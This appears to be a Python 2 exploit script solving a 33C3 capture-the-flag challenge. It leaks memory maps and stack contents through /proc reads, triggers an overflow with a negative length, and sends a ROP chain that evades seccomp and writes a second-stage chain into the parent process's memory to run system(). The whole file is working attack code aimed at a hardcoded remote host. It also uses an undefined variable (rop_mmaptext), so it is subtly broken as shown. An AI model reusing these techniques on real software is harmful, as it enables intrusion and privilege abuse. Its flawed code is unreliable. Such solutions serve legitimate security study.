import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]

def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data
    
def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def get_parent_process_id(sc):
    sc.send("r\n")
    sc.send("/proc/self/status\n")
    sc.send("0\n")
    sc.send("100000\n")

    data = read_until(sc, "quit? (y/n)")

    for line in data.split("\n"):
        if "PPid:" in line:
            ppid = int(line.split()[1])
            print "GOT PPID", ppid
            return ppid

def extract_addresses_from_maps(sc):
    sc.send("n\n")

    sc.send("r\n")
    sc.send("/proc/self/maps\n")
    sc.send("0\n")
    sc.send("100000\n")

    data = read_until(sc, "quit? (y/n)")

    stack_addr = None
    elf_addr = None
    libc_addr = None

    for line in data.split("\n"):
        if "[stack]" in line:
            stack_addr = int(line.split("-")[0], 16)
            print "parent stack address %16x" % stack_addr
            
        if line.startswith("7ff") and stack_addr is None:
            stack_addr = int(line.split("-")[0], 16)
            print "parent stack address %16x" % stack_addr
            
        if "r-xp" in line and ("/home/user/chal" in line or "/home/ymgve/33c3ctf/tea" in line):
            elf_addr = int(line.split("-")[0], 16)
            print "ELF address %16x" % elf_addr

        if "r-xp" in line and ("/lib64/libc-2.23.so" in line or "/lib/x86_64-linux-gnu/libc-2.19.so" in line):
            libc_addr = int(line.split("-")[0], 16)
            print "libc address %16x" % libc_addr
            
    if None in (stack_addr, elf_addr, libc_addr):
        print "Failed to find addresses from memory map, aborting"
        sc.close()
        exit()
        
    return stack_addr, elf_addr, libc_addr

def get_child_stack_info_from_parent_stack(sc):
    sc.send("n\n")        
    sc.send("r\n")
    sc.send("/proc/self/mem\n")
    sc.send(str(stack_addr + 0x1e000) + "\n")
    sc.send("8193\n")

    read_until(sc, "bytes\n")
    data = read_all(sc, 8192)
        
    memory = []
    for i in xrange(0, len(data), 8):
        memory.append((stack_addr + 0x1e000 + i, struct.unpack("<Q", data[i:i+8])[0]))
        
    baseaddr = None
    base = None
    offsetaddr = None
    offset = None
    
    for i in xrange(len(memory) - 1):
        if memory[i][1] & 0xfff == 0x440 and memory[i+1][1] & 0xfff == 0xb20:
            baseaddr, base = memory[i+3]
            offsetaddr, offset = memory[i-1]
            print "FOUND"
            print "base   %16x %16x" % (baseaddr, base)
            print "offset %16x %16x" % (offsetaddr, offset)

    if None in (baseaddr, base, offsetaddr, offset):
        print "Failed to find child stack info from parent stack, aborting"
        sc.close()
        exit()
        
    return baseaddr, base, offsetaddr, offset
    
sc = socket.create_connection(("104.155.105.0", 14000))

ppid = get_parent_process_id(sc)

stack_addr, elf_addr, libc_addr = extract_addresses_from_maps(sc)

baseaddr, base, offsetaddr, offset = get_child_stack_info_from_parent_stack(sc)

read_until(sc, "quit? (y/n)")
sc.send("n\n")        

sc.send("r\n")
sc.send("/proc/self/cmdline\n")
sc.send("0\n")

data = read_until(sc, "count?\n")

# read size is negative, so less than 32, set fd to stdin and set buf destination to return address
sc.send("-2147483648".ljust(0x28, "\x00") + Q(0) + Q(0) + Q(base + offset - 0x68) + "\n")

rop_poprdi = elf_addr + 0x00000000000024A3
rop_poprsi_popr15 = elf_addr + 0x00000000000024A1
rop_exit = elf_addr + 0x0000000000000B08
rop_open = elf_addr + 0x0000000000000AF8
rop_read = elf_addr + 0x0000000000000AA8
rop_lseek = elf_addr + 0x0000000000000A98
rop_write = elf_addr + 0x0000000000000A78
rop_puts = elf_addr + 0x0000000000000A68
rop_gets = elf_addr + 0x0000000000000AD0
rop_close = elf_addr + 0x0000000000000AA0

libc_poprdx = libc_addr + 0x00000000000463A1
libc_system = libc_addr + 0x0000000000043F40

workspace = (base + offset - 0x10000)

# close stderr, should have been blocked by seccomp, but the high bit set makes it go through
rop  = Q(rop_poprdi) + Q(0x8000000000000002) + Q(rop_close)

# just a stream synch point, for some reason doesn't work without it
rop += Q(rop_poprdi) + Q(rop_mmaptext) + Q(rop_puts)

# read file name into workspace area
rop += Q(rop_poprdi) + Q(workspace) + Q(rop_gets)

# open parent memory
rop += Q(rop_poprdi) + Q(workspace) + Q(rop_poprsi_popr15) + Q(2) * 2 + Q(rop_open)

# read 2nd stage ROP
rop += Q(rop_poprdi) + Q(0) + Q(rop_poprsi_popr15) + Q(workspace+0x1000) * 2 + Q(libc_poprdx) + Q(0x100) + Q(rop_read)

# fseek to stack
rop += Q(rop_poprdi) + Q(2) + Q(rop_poprsi_popr15) + Q(offsetaddr-0x20) * 2 + Q(libc_poprdx) + Q(0) + Q(rop_lseek)

# write to parent stack
rop += Q(rop_poprdi) + Q(2) + Q(rop_poprsi_popr15) + Q(workspace+0x1000) * 2 + Q(libc_poprdx) + Q(0x100) + Q(rop_write)

# exit, control returns to parent
rop += Q(rop_exit)

if "\n" in rop:
    print "BAD ROP"
    exit()
    
sc.send(rop + "\n")

# synch point
read_until(sc, "(mmap)\n")

# parent memory file name
sc.send("/proc/%d/mem\n" % ppid)

# 2nd stage ROP
sc.send(Q(rop_poprdi) + Q(offsetaddr) + Q(libc_system) + Q(rop_exit) + "/home/user/getflag\x00")

# 33C3_why_do_y0u_3ven_filter?!?

# t = telnetlib.Telnet()                                                  
# t.sock = sc
# t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    